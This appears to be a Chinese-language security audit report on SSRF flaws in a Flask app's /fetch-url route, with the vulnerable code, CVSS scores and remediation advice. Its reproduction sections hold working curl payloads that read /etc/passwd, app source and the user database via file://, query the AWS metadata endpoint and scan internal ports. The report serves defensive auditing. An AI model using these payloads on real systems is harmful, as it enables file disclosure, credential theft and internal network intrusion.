# URL 抓取功能安全审计报告

**审计模块：** `/fetch-url` POST 路由  
**漏洞数量：** 共发现 **3 项安全漏洞**

---

## 漏洞总览

| 编号 | 漏洞名称 | 触发位置 | 风险等级 |
|------|---------|---------|---------|
| VULN-SSRF-01 | 协议未限制致任意文件读取 | `app.py` 第 547 行 `urlopen(url)` | 高危 |
| VULN-SSRF-02 | 内网地址未限制致 SSRF 攻击 | `app.py` 第 547 行 `urlopen(url)` | 高危 |
| VULN-SSRF-03 | URL 及端口未校验致资源扫描 | `app.py` 第 542-547 行 | 中危 |

---

## 漏洞详情

### VULN-SSRF-01：协议未限制致任意文件读取

**【漏洞原理】**

`urllib.request.urlopen()` 支持多种 URL 协议，包括 `http://`、`https://`、`file://`、`ftp://` 等。代码未对 url 参数做任何协议白名单限制，攻击者可通过 `file://` 协议读取服务器本地任意文件。

**【漏洞代码】**

```python
url = request.form.get("url", "")
resp = urllib.request.urlopen(url, timeout=10)  # 直接访问任意协议
content = resp.read().decode("utf-8", errors="replace")[:5000]
```

**【复现方式】**

```bash
# 读取系统密码文件
curl -X POST -d "url=file:///etc/passwd" -b "session=..." \
  https://127.0.0.1:5000/fetch-url

# 读取应用源码
curl -X POST -d "url=file:///path/to/app.py" -b "session=..." \
  https://127.0.0.1:5000/fetch-url

# 读取数据库文件
curl -X POST -d "url=file:///path/to/data/users.db" -b "session=..." \
  https://127.0.0.1:5000/fetch-url
```

**【风险等级】** ⛔ 高危 — CVSS 3.1 Score: 8.6

攻击者可通过构造 `file://` URL 读取服务器上任意文件，包括系统配置文件、应用源码、数据库文件、SSL 私钥等敏感信息。

---

### VULN-SSRF-02：内网地址未限制致 SSRF 攻击

**【漏洞原理】**

代码未对目标 IP 地址做任何检查，攻击者可构造指向内网地址的 URL，以服务器身份访问内部网络资源，绕过防火墙访问隔离的内部服务。

**【漏洞代码】**

```python
url = request.form.get("url", "")
resp = urllib.request.urlopen(url, timeout=10)  # 可访问内网任意服务
```

**【复现方式】**

```bash
# 扫描本地端口
curl -X POST -d "url=http://127.0.0.1:5000" -b "session=..." \
  https://127.0.0.1:5000/fetch-url

# 访问内网服务
curl -X POST -d "url=http://10.0.0.1:80" -b "session=..." \
  https://127.0.0.1:5000/fetch-url

# 访问云元数据接口（AWS）
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" -b "session=..." \
  https://127.0.0.1:5000/fetch-url
```

**【风险等级】** ⛔ 高危 — CVSS 3.1 Score: 8.2

攻击者可将服务器作为跳板，扫描内网端口、攻击内部服务、获取云服务器元数据（可能包含临时凭据）。

---

### VULN-SSRF-03：URL 及端口未校验致资源扫描

**【漏洞原理】**

未校验 URL 格式合法性及端口号范围，攻击者可利用服务器网络资源对外部或内部进行端口扫描、服务探测。

**【复现方式】**

```bash
# 端口扫描
curl -X POST -d "url=http://127.0.0.1:22" -b "session=..." ...
curl -X POST -d "url=http://127.0.0.1:3306" -b "session=..." ...
curl -X POST -d "url=http://192.168.1.1:80" -b "session=..." ...
```

**【风险等级】** ⚠️ 中危 — CVSS 3.1 Score: 5.3

攻击者可利用该漏洞探测内外网开放端口，为后续攻击提供信息支撑。

---

## 修复措施对照

| 漏洞 | 修复方式 |
|------|---------|
| VULN-SSRF-01 任意文件读取 | 协议白名单：仅允许 http:// 和 https:// |
| VULN-SSRF-02 内网 SSRF | IP 黑名单：阻止回环地址、私有网段、云元数据 |
| VULN-SSRF-03 端口扫描 | URL 格式校验 + 端口范围限制 |
